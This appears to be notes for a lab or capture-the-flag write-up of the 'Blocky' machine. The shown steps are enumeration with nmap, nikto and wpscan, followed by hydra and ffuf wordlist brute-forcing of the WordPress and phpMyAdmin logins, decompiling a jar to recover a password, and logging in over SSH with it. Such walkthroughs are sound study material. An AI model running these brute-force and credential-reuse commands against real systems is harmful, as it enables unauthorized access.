Blocky
========================

## Enumeration

    sudo nmap_enum 10.10.10.37 | tee nmap_output.txt

![qownnotes-media-MVzRqN](../../../media/qownnotes-media-MVzRqN.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.37 | tee nmap_udp_output.txt

![qownnotes-media-njjIzT](../../../media/qownnotes-media-njjIzT.png)

    sudo nmap -p- -Pn -T5 -n 10.10.10.37 | tee nmap_fullportstcp_output.txt
    
![qownnotes-media-HmsUZC](../../../media/qownnotes-media-HmsUZC.png)

    sudo nmap -sS --script vuln -n -T5 -Pn 10.10.10.37 -p 21,22,80,25565 | tee nmap_vulns.txt
    
![qownnotes-media-AGngxA](../../../media/qownnotes-media-AGngxA.png)

    nikto -host http://10.10.10.37 -T x 6 | tee nikto_output.txt

 ![qownnotes-media-VKbaTL](../../../media/qownnotes-media-VKbaTL.png)


    ftp -a -A 10.10.10.37

![qownnotes-media-fjTZWj](../../../media/qownnotes-media-fjTZWj.png)

    wpscan --url http://blocky.htb --no-update --disable-tls-checks -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee tcp_port_protocol_wpscan.txt

![qownnotes-media-tASGkj](../../../media/qownnotes-media-tASGkj.png)


    searchsploit twentyseventeen
    searchsploit wordpress 4.8
    
    
    ffuf -w /usr/share/wordlists/rockyou.txt -u 'http://blocky.htb/wp-login.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://blocky.htb' -H 'Connection: keep-alive' -H 'Referer: http://blocky.htb/wp-login.php' -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' -H 'Upgrade-Insecure-Requests: 1' -d 'log=notch&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblocky.htb%2Fwp-admin%2F&testcookie=1' -fs 3382
    
    hydra -l notch -P /usr/share/wordlists/rockyou.txt blocky.htb http-post-form "/wp-login.php:log=notch&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblocky.htb%2Fwp-admin%2F&testcookie=1:ERROR"

![qownnotes-media-upGfEG](../../../media/qownnotes-media-upGfEG.png)

 
    cewl http://blocky.htb -m 3 --with-numbers -w cewl.txt
    hydra -l notch -P cewl.txt 10.10.10.37 http-post-form "/wp-login.php:log=notch&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblocky.htb%2Fwp-admin%2F&testcookie=1:ERROR"
    
    export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
    hydra -l notch -P cewl.txt blocky.htb http-post-form "/wp-login.php:log=notch&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblocky.htb%2Fwp-admin%2F&testcookie=1:ERROR"

![qownnotes-media-lZiQWE](../../../media/qownnotes-media-lZiQWE.png)

    ffuf -u http://blocky.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e ".txt,.html,.php" -x http://127.0.0.1:8080 -fs 52227
 
![qownnotes-media-yYNWHB](../../../media/qownnotes-media-yYNWHB.png)

![qownnotes-media-kUnOCz](../../../media/qownnotes-media-kUnOCz.png)

    ffuf -w /usr/share/wordlists/rockyou.txt -u 'http://blocky.htb/phpmyadmin/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://blocky.htb' -H 'Connection: keep-alive' -H 'Referer: http://blocky.htb/phpmyadmin/' -H 'Cookie: pmaCookieVer=4; phpMyAdmin=sbu4183iulg3d7g62jqrkva9hug5rhio; pma_lang=en; pma_collation_connection=utf8_unicode_ci; wordpress_test_cookie=WP+Cookie+check' -H 'Upgrade-Insecure-Requests: 1' -d 'pma_username=notch&pma_password=FUZZ&server=1&target=index.php&lang=en&collation_connection=utf8_unicode_ci&token=d0d04837ccc981bbb0ac831c5c04eaca' -x http://127.0.0.1:8080 -fs 10012,10016

    ffuf -w cewl.txt -u 'http://blocky.htb/phpmyadmin/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://blocky.htb' -H 'Connection: keep-alive' -H 'Referer: http://blocky.htb/phpmyadmin/' -H 'Cookie: pmaCookieVer=4; phpMyAdmin=sbu4183iulg3d7g62jqrkva9hug5rhio; pma_lang=en; pma_collation_connection=utf8_unicode_ci; wordpress_test_cookie=WP+Cookie+check' -H 'Upgrade-Insecure-Requests: 1' -d 'pma_username=notch&pma_password=FUZZ&server=1&target=index.php&lang=en&collation_connection=utf8_unicode_ci&token=d0d04837ccc981bbb0ac831c5c04eaca' -x http://127.0.0.1:8080 -fs 10012,10016

![qownnotes-media-MPFgKB](../../../media/qownnotes-media-MPFgKB.png)

    hydra -l notch -P /usr/share/wordlists/rockyou.txt blocky.htb http-post-form "/phpmyadmin/index.php:pma_username=notch&pma_password=^PASS^&server=1&target=index.php&lang=en&collation_connection=utf8_unicode_ci&token=56036ad091bc85859dcd957a407743bc:Access denied for user"
    
    hydra -l notch -P cewl.txt blocky.htb http-post-form "/phpmyadmin/index.php:pma_username=notch&pma_password=^PASS^&server=1&target=index.php&lang=en&collation_connection=utf8_unicode_ci&token=56036ad091bc85859dcd957a407743bc:Access denied for user"
    

## Exploitation
    
![qownnotes-media-gKpypE](../../../media/qownnotes-media-gKpypE.png)



Daqui baixamos o arquivo BlockyCore.jar e decompilamos com jd-gui

    sudo apt update
    sudo apt install jd-gui
    jd-gui BlockyCore.jar

![qownnotes-media-bROezZ](../../../media/qownnotes-media-bROezZ.png)

Como já tínhamos enumerado o usuário notch, tentamos com a seguinte credencial via SSH:

notch
8YsqfCTnvxAUeduzjNSXe22

    ssh notch@blocky.htb
    
![qownnotes-media-kmZFIU](../../../media/qownnotes-media-kmZFIU.png)

## Privilege Escalation

![qownnotes-media-BNTfDi](../../../media/qownnotes-media-BNTfDi.png)
